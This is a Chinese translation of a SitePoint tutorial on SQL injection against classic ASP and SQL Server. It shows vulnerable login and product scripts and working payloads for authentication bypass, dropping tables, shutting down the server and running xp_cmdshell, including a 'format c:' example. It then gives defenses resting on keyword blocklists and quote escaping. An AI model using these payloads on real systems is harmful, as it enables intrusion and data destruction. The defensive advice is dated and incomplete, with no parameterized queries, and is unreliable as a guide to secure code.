# SQL 注入攻击–您安全吗？

> 原文：<https://www.sitepoint.com/sql-injection-attacks-safe/>

数据库是大多数网络应用程序的心脏:它存储着网站和应用程序“生存”所需的数据。它存储用户凭证和敏感的财务信息。它存储偏好、发票、付款、库存数据等。正是通过数据库和 Web 脚本语言的结合，我们作为开发人员才能开发出让客户满意的网站，支付账单，最重要的是运营我们的业务。

但是，当您意识到您的关键数据可能不安全时，会发生什么呢？当你意识到刚刚发现了一个新的安全漏洞时会发生什么？最有可能的是，您要么修补它，要么将您的数据库服务器升级到一个更新的、无错误的版本。数据库和编程语言中总是会发现安全漏洞和补丁，但我敢打赌，你们中 90%的人从未听说过 SQL 注入攻击…

在本文中，我将尝试揭示这种记录不足的攻击，解释什么是 SQL 注入攻击，以及如何防止在您的公司内发生这种攻击。到本文结束时，您将能够识别 SQL 注入攻击可能允许未授权人员渗透您的系统的情况，并且您将学习如何修复现有代码以防止 SQL 注入攻击。

##### 什么是 SQL 注入攻击？

你可能知道，SQL 代表结构化查询语言。它有许多不同的方言，其中大多数都基于 SQL-92 ANSI 标准。一个 SQL 查询包含一个或多个 SQL 命令，如`SELECT`、`UPDATE`或`INSERT`。对于`SELECT`查询，每个查询通常有一个返回数据的子句，例如:

```
SELECT * FROM Users WHERE userName = 'justin';
```

上面的 SQL 查询中的子句是`WHERE username = 'justin',`,这意味着我们只希望返回 Users 表中 userName 字段等于 Justin 的字符串值的行。

正是这些类型的查询使得 SQL 语言如此流行和灵活…这也使得它容易受到 SQL 注入攻击。顾名思义，SQL 注入攻击“注入”或操纵 SQL 代码。通过向查询中添加意外的 SQL，有可能以许多意想不到的方式操作数据库。

在网站上验证用户最流行的方法之一是为他们提供一个 HTML 表单，他们可以通过这个表单输入用户名和密码。假设我们有以下简单的 HTML 表单:

```
<form name="frmLogin" action="login.asp" method="post"> 

 Username: <input type="text" name="userName"> 

 Password: <input type="text" name="password"> 

 <input type="submit"> 

</form>
```

提交表单时，用户名和密码字段的内容被传递给 login.asp 脚本，并通过`Request.Form`集合供该脚本使用。验证该用户最简单的方法是构建一个 SQL 查询，然后对照数据库检查该查询，看该用户是否存在。我们可以创建这样一个 login.asp 脚本:

```
<% 

 dim userName, password, query 

 dim conn, rS 

 userName = Request.Form("userName") 

 password = Request.Form("password") 

 set conn = server.createObject("ADODB.Connection") 

 set rs = server.createObject("ADODB.Recordset") 

 query = "select count(*) from users where userName='" &  

userName & "' and userPass='" & password & "'" 

 conn.Open "Provider=SQLOLEDB; Data Source=(local);  

Initial Catalog=myDB; User Id=sa; Password=" 

 rs.activeConnection = conn 

 rs.open query 

 if not rs.eof then 

 response.write "Logged In" 

 else 

 response.write "Bad Credentials" 

 end if 

%>
```

在上面的例子中，如果用户的凭证与数据库中的记录匹配，用户会看到“已登录”，如果不匹配，则会看到“坏凭证”。在继续之前，让我们创建我们在示例代码中查询过的数据库。

让我们也创建一个包含一些虚拟记录的用户表:

```
create database myDB  

go  

use myDB  

go  

create table users  

(  

 userId int identity(1,1) not null,  

 userName varchar(50) not null,  

 userPass varchar(20) not null  

)  

insert into users(userName, userPass) values('john', 'doe')  

insert into users(userName, userPass) values('admin', 'wwz04ff')  

insert into users(userName, userPass) values('fsmith', 'mypassword')
```

因此，如果我输入用户名 john 和密码 doe，那么我将看到文本“已登录”。该查询类似于以下内容:

```
select count(*) from users where userName='john' and userPass='doe'
```

这个查询没有什么不安全或危险的…是吗？也许第一眼看不出来，但是如果我输入用户名 john 和密码‘or 1 = 1——

结果查询现在看起来像这样:

```
select count(*) from users where userName='john' and userPass=''   

or 1=1 --'
```

在上面的例子中，我用斜体显示了用户名和密码，这样它们更容易阅读，但基本上发生的情况是，查询现在只检查用户名字段为 john 的任何用户。现在，它不是检查匹配的密码，而是检查空密码，或者条件等式 1=1。这意味着如果 password 字段为空或者 1 等于 1(确实如此)，那么在 users 表中找到了一个有效行。请注意最后一个引号是如何用单行注释分隔符(–)注释掉的。这将阻止 ASP 返回关于任何未结束的引用的错误。

因此，使用我们上面创建的 login.asp 脚本，将返回一行，并显示文本“已登录”。我们可以更进一步，对用户名字段做同样的事情，如下所示:

```
Username: ' or 1=1 ---  

Password: [Empty]
```

这将对用户表执行以下查询:

```
select count(*) from users where userName='' or 1=1 --' and userPass=''
```

上面的查询现在返回用户表中所有行的计数。这是一个完美的 SQL 注入攻击的例子:添加操纵查询内容的代码来执行不希望的结果。

根据登录名表验证用户的另一种流行方法是将他们的详细信息与该表进行比较，并从数据库中检索有效的用户名，如下所示:

```
 query = "select userName from users where userName='" &   

userName & "' and userPass='" & password & "'"  

 conn.Open "Provider=SQLOLEDB; Data Source=(local);   

Initial Catalog=myDB; User Id=sa; Password="  

 rs.activeConnection = conn  

 rs.open query  

 if not rs.eof then  

 response.write "Logged In As " & rs.fields(0).value  

 else  

 response.write "Bad Credentials"  

 end if
```

因此，如果我们输入用户名 john 和密码 doe，那么我们将看到:

```
Logged In As john
```

但是，如果我们使用以下登录凭据:

```
Username: ' or 1=1 ---  

Password: [Anything]
```

那么我们也将以 John 的身份登录，因为根据我们前面看到的插入查询，用户名字段为 John 的行在列表中排在第一位:

```
insert into users(userName, userPass) values('john', 'doe')  

insert into users(userName, userPass) values('admin', 'wwz04ff')  

insert into users(userName, userPass) values('fsmith', 'mypassword') 

##### 注入攻击示例

通过 HTML 表单强制登录，就像我们刚刚在上看到的那样，是 SQL 注入攻击的一个典型例子，稍后我们将研究修复这类攻击的方法。

但首先，我想看看 SQL 注入袭击处决的一些例子。首先，让我们继续使用我们的示例登录表单，它包含用户名和密码字段。

 ***例#1 *** 

Microsoft SQL Server 有自己的 SQL 方言，称为 Transact SQL，简称 t SQL。我们可以通过多种方式利用 TSQL 的力量来展示 SQL 注入攻击是如何运作的。考虑下面的查询，它基于我们在上一页中创建的用户表:

```
select userName from users where userName='' having 1=1
```

如果您是一个 SQL 爱好者，那么您无疑会意识到这个查询会引发一个错误。通过使用这些登录凭证，我们可以轻松地让我们的 login 页面使用该查询来查询我们的数据库:

```
Username: ' having 1=1 ---   

Password: [Anything]
```

当我单击 submit 按钮启动登录过程时，SQL 查询导致 ASP 向浏览器显示以下错误:

```
Microsoft OLE DB Provider for SQL Server (0x80040E14)
```

列'`users.userName`'在选择列表中无效，因为它不包含在聚合函数中，并且没有`GROUP BY` 子句。

```
/login.asp, line 16
```

好好好。现在，这个错误消息似乎告诉了未授权用户数据库中的一个字段名，我们试图根据这个字段名来验证登录凭证:`users.userName`。使用该字段的名称，我们现在可以使用 SQL Server 的`LIKE`关键字以下列凭证登录:

```
Username: ' or users.userName like 'a%' ---   

Password: [Anything]
```

这再次对我们的 users 表执行了一个注入的 SQL 查询:

```
select userName from users where userName='' or    

users.userName like 'a%' --' and userPass=''
```

当我们创建用户表时，我们还创建了一个用户，其用户名字段是 admin，用户通行证字段是 wwz04ff。使用上面显示的用户名和密码登录使用 SQL 的 like 关键字来获取用户名。该查询获取用户名字段以 a 开头的第一行的用户名字段，在本例中是 admin:

```
Logged In As admin
```

 ***例二*** 

在其他数据库中，SQL Server 用分号分隔查询。分号的使用允许多个查询作为一个批处理提交并按顺序执行，例如:

```
select 1; select 1+2; select 1+3;
```

...会返回三个记录集。第一个包含值 1，第二个包含值 3，第三个包含值 4，依此类推。因此，如果我们使用以下凭据登录:

```
Username: ' or 1=1; drop table users; --   

Password: [Anything]
```

那么查询将分两部分执行。首先，它将为 users 表中的所有行选择 userName 字段。其次，它将删除 users 表，这样当我们下次登录时，我们将看到以下错误:

```
Microsoft OLE DB Provider for SQL Server (0x80040E37)   

Invalid object name 'users'.   

/login.asp, line 16
```

 ***例#3 *** 

我们要考虑的与登录表单相关的最后一个例子是 TSQL 特定命令和扩展存储过程的执行。许多网站在从其 ASP 脚本或应用程序登录到 SQL Server 时使用默认的系统帐户(sa)用户。默认情况下，该用户可以访问所有命令，并且可以删除、重命名和添加数据库、表、触发器等。

SQL Server 最强大的命令之一是`SHUTDOWN WITH NOWAIT`，它会导致 SQL Server 关闭，立即停止 Windows 服务。若要在发出此命令后重新启动 SQL server，您需要使用 SQL 服务管理器或其他一些重新启动 SQL server 的方法。

同样，可以通过我们的登录示例利用该命令:

```
Username: '; shutdown with nowait; --   

Password: [Anything]
```

这将使我们的 login.asp 脚本运行以下查询:

```
select userName from users where userName='';    

shutdown with nowait; --' and userPass=''
```

如果用户被设置为默认 sa 帐户，或者用户具有所需的权限，则 SQL server 将关闭，并需要重新启动才能再次运行。

SQL Server 还包括几个扩展存储过程，它们基本上是特殊的 C++ DLL，可以包含强大的 C/C++代码来操作服务器、读取目录和注册表、删除文件、运行命令提示符等。所有扩展存储过程都存在于 master 数据库下，并带有前缀“`xp_`”。

有几个扩展存储过程可能会对系统造成永久性损坏。我们可以使用我们的登录表单执行一个扩展的存储过程，将注入的命令作为用户名，如下所示:

```
Username: '; exec master..xp_xxx; --   

Password: [Anything]
```

我们所要做的就是选择适当的扩展存储过程，并用上面示例中的名称替换 `xp_xxx` 。例如，如果 IIS 与 SQL Server 安装在同一台机器上(这对于一两个人的小型安装来说是典型的)，那么我们可以通过使用`xp_cmdshell`扩展存储过程(它将一个命令字符串作为操作系统命令执行)和 IIS reset 来重新启动它。我们需要做的只是在我们的 getlogin.asp 页面中输入以下用户凭据:

```
Username: '; exec master..xp_cmdshell 'iisreset'; --   

Password: [Anything]
```

这将向 SQL Server 发送以下查询:

```
select userName from users where userName='';    

exec master..xp_cmdshell 'iisreset'; --' and userPass=''
```

我相信你会同意，这可能会导致严重的问题，如果使用正确的命令，可能会导致整个网站出现故障。

 ***例#4 *** 

好了，是时候从看 login.asp 脚本转移到另一个执行 SQL 注入攻击的常用方法了。

你有多少次访问过出售你最喜欢的装备的网站，并看到过这样的网址:

```
www.mysite.com/products.asp?productId=2
```

显然，2 是产品的 ID，许多网站会简单地围绕 productId querystring 变量构建一个查询，如下所示:

```
Select prodName from products where id = 2
```

在我们继续之前，让我们假设我们在 SQL server 上设置了以下表和行:

```
create table products    

(    

 id int identity(1,1) not null,    

 prodName varchar(50) not null,    

)    

insert into products(prodName) values('Pink Hoola Hoop')    

insert into products(prodName) values('Green Soccer Ball')    

insert into products(prodName) values('Orange Rocking Chair')
```

我们还假设已经创建了以下 ASP 脚本，并将其命名为 products.asp:

```
<%    

 dim prodId    

 prodId = Request.QueryString("productId")    

 set conn = server.createObject("ADODB.Connection")    

 set rs = server.createObject("ADODB.Recordset")    

 query = "select prodName from products where id = " & prodId    

 conn.Open "Provider=SQLOLEDB; Data Source=(local);     

Initial Catalog=myDB; User Id=sa; Password="    

 rs.activeConnection = conn    

 rs.open query    

 if not rs.eof then    

 response.write "Got product " & rs.fields("prodName").value    

 else    

 response.write "No product found"    

 end if    

%>
```

因此，如果我们在浏览器中使用以下 URL 访问 products.asp:

```
http://localhost/products.asp?productId=1
```

...我们会在浏览器中看到下面一行文本:

```
Got product Pink Hoola Hoop
```

注意，这一次，product.asp 根据字段的名称从记录集中返回一个字段:

```
response.write "Got product " & rs.fields("prodName").value
```

虽然这看起来更安全，但实际上并不安全，我们仍然可以像在最后三个例子中那样操作数据库。还要注意，这次查询的`WHERE`子句基于一个数值:

```
query = "select prodName from products where id = " & prodId
```

为了让 products.asp 页面正常工作，所需要的只是一个作为 productId querystring 变量传递的数字产品 Id。然而，解决这个问题并不是太大的问题。考虑以下 products.asp 的 URL:

```
http://localhost/products.asp?productId=0%20or%201=1
```

URL 中的每个%20 代表一个 URL 编码的空格字符，因此 URL 实际上看起来像这样:

```
http://localhost/products.asp?productId=0 or 1=1
```

当与 products.asp 结合使用时，查询如下所示:

```
select prodName from products where id = 0 or 1=1
```

使用一些技巧和 URL 编码，我们可以很容易地从 products 表中提取 products 字段的名称:

```
http://localhost/products.asp?productId=0%20having%201=1
```

这将在浏览器中产生以下错误:

```
Microsoft OLE DB Provider for SQL Server (0x80040E14)    

Column 'products.prodName' is invalid in the select     

list because it is not contained in an aggregate     

function and there is no GROUP BY clause.    

/products.asp, line 13
```

现在，我们可以获取产品字段的名称(`products.prodName`)并在浏览器中调用以下 URL:

```
http://localhost/products.asp?productId=0;insert%20into%20products    

(prodName)%20values(left(@@version,50))
```

以下是不带 URL 编码空格的查询:

```
http://localhost/products.asp?productId=0;insert into     

products(prodName) values(left(@@version,50))
```

基本上，它返回“没有找到产品”，但是它也在 products 表上运行一个`INSERT` 查询，添加 SQL server 的@@version 变量的前 50 个字符(它包含 SQL Server 的版本、内部版本等细节)。)作为产品表中的新记录。

在现实生活中，您显然需要更多地利用 products 表，因为它包含许多其他字段，但是方法是相同的。

要获得版本，现在只需用 products 表中最新条目的值调用 products.asp 页面，如下所示:

```
http://localhost/products.asp?productId=(select%20max(id)    

%20from%20products)
```

该查询使用 SQL server 的`MAX`函数获取添加到 products 表中的最新一行的 ID。结果输出包含 SQL server 版本详细信息的新行:

```
Got product Microsoft SQL Server 2000 - 8.00.534 (Intel X86)
```

这种注射方法可用于执行多种任务。然而，这篇文章的重点是给出如何防止 SQL 注入攻击的提示，这是我们接下来要看的。

##### 防止 SQL 注入攻击

如果您仔细设计您的脚本和应用程序，SQL 注入攻击在大多数情况下是可以避免的。作为开发人员，我们可以做很多事情来降低我们的网站易受攻击的程度。以下是我们的选项列表(排名不分先后):

 ***限制用户访问*** 

由于 SQL server 2000 的默认系统帐户(sa)具有不受限制的特性，因此永远不要使用它。您应该始终为特定目的设置特定帐户。

例如，如果您运行一个允许站点用户查看和订购产品的数据库，那么您应该设置一个名为`webUser_public`的用户，他对产品表拥有`SELECT`权限，而对订单表只拥有`INSERT` 权限。

如果您不使用扩展存储过程，或者有未使用的触发器、存储过程、用户定义的函数等，那么就删除它们，或者将它们移到一个独立的服务器上。大多数极具破坏性的 SQL 注入攻击试图利用几个扩展存储过程，如`xp_cmdshell` 和`xp_grantlogin`，所以通过删除它们，理论上可以在攻击发生之前阻止它。

 ***转义引号*** 

正如我们从上面讨论的例子中看到的，大多数注入攻击需要使用单引号来终止表达式。通过使用一个简单的替换函数并将所有单引号转换成两个单引号，您可以大大降低注入攻击成功的机会。

使用 ASP，创建一个自动处理单引号的通用替换函数很简单，就像这样:

```
<%     

 function stripQuotes(strWords)     

 stripQuotes = replace(strWords, "'", "''")     

 end function     

%>
```

例如，现在如果我们将`stripQuotes`函数与我们的第一个查询结合使用，那么它将是这样的:

```
select count(*) from users where userName='john' and      

userPass='' or 1=1 --'
```

...对此:

```
select count(*) from users where userName='john'' and      

userPass=''' or 1=1 --'
```

这实际上阻止了注入攻击的发生，因为用于查询的子句现在要求用户名和用户通行证字段都有效。

 ***清除罪魁祸首字符/字符序列*** 

正如我们在本文中看到的，某些字符和字符序列，如`;`、`--`、`select`、`insert`和`xp_` ，可以用来执行 SQL 注入攻击。通过在构建查询之前从用户输入中删除这些字符和字符序列，我们可以帮助进一步减少注入攻击的机会。

与单引号解决方案一样，我们只需要一个基本函数来处理所有这些问题:

```
<%     

 function killChars(strWords)     

 dim badChars     

 dim newChars     

 badChars = array("select", "drop", ";", "--", "insert",      

"delete", "xp_")     

 newChars = strWords     

 for i = 0 to uBound(badChars)     

 newChars = replace(newChars, badChars(i), "")     

 next     

 killChars = newChars     

 end function     

%>
```

结合使用`stripQuotes`和`killChars`极大地消除了任何 SQL 注入攻击成功的机会。所以如果我们有这样的疑问:

```
select prodName from products where id=1; xp_cmdshell 'format      

c: /q /yes '; drop database myDB; --
```

并通过`stripQuotes`和`killChars`运行它，它最终看起来像这样:

```
prodName from products where id=1 cmdshell ''format c:      

/q /yes '' database myDB
```

...这基本上是没用的，查询不会返回任何记录。

 ***限制用户输入的长度*** 

如果要比较的字段只能接受 10 个字符，那么在表单上有一个可以接受 50 个字符的文本框是没有用的。通过使所有文本框和表单域尽可能短，您就减少了可用于策划 SQL 注入攻击的字符数。

如果您接受一个产品 ID 的 querystring 值或类似的值，总是使用一个函数来检查该值是否实际上是数字，比如 ASP 的`IsNumeric()` 函数。如果该值不是数字，那么要么引发一个错误，要么将用户重定向到另一个可以选择产品的页面。

此外，总是尝试发布 method 属性设置为`POST`的表单，这样有线索的用户不会有任何想法——如果他们看到您的表单变量被附加到 URL 的末尾，他们可能会有想法。

##### 结论

在本文中，我们已经了解了什么是 SQL 注入攻击，以及如何篡改表单和 URL 来产生攻击结果。

防范每一种类型的 SQL 注入攻击并不总是可能的，但是，希望你现在知道存在的各种类型的 SQL 注入攻击，并且已经计划了在你的服务器上对抗它们的方法。

虽然在本文中我们只研究了针对 Microsoft SQL server 的 SQL 注入攻击，但是请记住，没有一个数据库是安全的:SQL 注入攻击也可能发生在 MySQL 和 Oracle 数据库服务器等服务器上。

## 分享这篇文章

```